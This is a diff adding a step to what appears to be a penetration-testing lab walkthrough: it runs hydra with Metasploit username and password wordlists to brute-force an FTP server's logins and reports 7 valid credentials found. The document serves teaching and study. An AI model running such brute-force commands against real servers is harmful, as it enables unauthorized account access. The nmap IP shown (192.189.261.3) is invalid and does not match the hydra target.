@@ -62,6 +62,24 @@ Commands: nmap 192.189.261.3 -p 21 -sV -O
 <br />
 <br />
 <br />
+Utilize the hydra tool to perform a brute-force password attack on the target FTP server: <br/>
+<br/>
+- Hydra is an open source, password brute-forcing tool designed around flexibility and high performance in online brute-force attacks.
+<br/>
+- We can see that the hydra tool found 7 valid passwords with the username included as well.
+<br/>
+<br/>
+Commands: hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.189.216.3 ftp
+<br/>
+<br/>
+<img src="https://i.imgur.com/Ht9U4F3.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
 
 
 
